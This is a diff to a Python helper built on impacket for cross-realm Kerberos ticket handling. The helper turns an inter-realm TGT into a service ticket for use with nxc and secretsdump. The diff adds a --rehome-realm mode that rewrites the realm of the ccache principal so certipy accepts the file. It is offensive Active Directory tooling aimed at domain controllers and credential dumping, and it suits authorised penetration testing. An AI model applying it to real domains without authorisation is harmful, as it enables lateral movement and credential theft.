@@ -11,6 +11,9 @@ getST falls through to a no-pass authentication that fails with
 This helper loads the cross-realm TGT directly out of the input ccache, calls
 ``getKerberosTGS`` against the target realm's KDC, and writes the resulting TGS
 to a new ccache that ``nxc`` / ``secretsdump`` consume via ``KRB5CCNAME``.
+
+``--rehome-realm`` rewrites only the ccache header principal's realm, leaving
+every ticket untouched.
 """
 
 import argparse
@@ -22,23 +25,51 @@ from impacket.krb5.kerberosv5 import getKerberosTGS
 from impacket.krb5.types import Principal
 
 
+def rehome(in_ccache: str, out_ccache: str, realm: str) -> int:
+    """Copy `in_ccache` to `out_ccache` with the header principal realm set to `realm`."""
+    cc = CCache.loadFile(in_ccache)
+    if cc is None:
+        print(f"[!] failed to load {in_ccache}", file=sys.stderr)
+        return 2
+    if not cc.principal:
+        print(f"[!] no principal in {in_ccache}", file=sys.stderr)
+        return 3
+    cc.principal.realm["data"] = realm.encode()
+    cc.principal.realm["length"] = len(realm)
+    cc.saveFile(out_ccache)
+    print(f"[+] re-homed ccache principal realm to {realm} at {out_ccache}", file=sys.stderr)
+    return 0
+
+
 def main() -> int:
     p = argparse.ArgumentParser()
     p.add_argument("--in-ccache", required=True, help="ccache containing the cross-realm TGT")
     p.add_argument("--out-ccache", required=True, help="ccache to write resulting TGS to")
-    p.add_argument("--spn", required=True, help="service SPN, e.g. cifs/dc.target.local")
-    p.add_argument("--source-realm", required=True, help="realm where the TGT was issued")
+    p.add_argument("--spn", help="service SPN, e.g. cifs/dc.target.local")
+    p.add_argument("--source-realm", help="realm where the TGT was issued")
     p.add_argument("--target-realm", required=True, help="realm of the SPN")
-    p.add_argument("--target-kdc", required=True, help="target realm KDC IP/host to send TGS-REQ to")
+    p.add_argument("--target-kdc", help="target realm KDC IP/host to send TGS-REQ to")
     p.add_argument(
         "--append",
         action="store_true",
         help="if --out-ccache exists, load it and merge the new TGS into it (preserves the inter-realm TGT and any prior service tickets)",
     )
+    p.add_argument(
+        "--rehome-realm",
+        action="store_true",
+        help="skip the TGS request; just copy --in-ccache to --out-ccache with the header principal realm set to --target-realm (certipy consumability)",
+    )
     args = p.parse_args()
 
-    src_realm = args.source_realm.upper()
+    src_realm = (args.source_realm or "").upper()
     tgt_realm = args.target_realm.upper()
+
+    if args.rehome_realm:
+        return rehome(args.in_ccache, args.out_ccache, tgt_realm)
+
+    for required in ("spn", "source_realm", "target_kdc"):
+        if not getattr(args, required):
+            p.error(f"--{required.replace('_', '-')} is required without --rehome-realm")
 
     in_cc = CCache.loadFile(args.in_ccache)
     if in_cc is None:
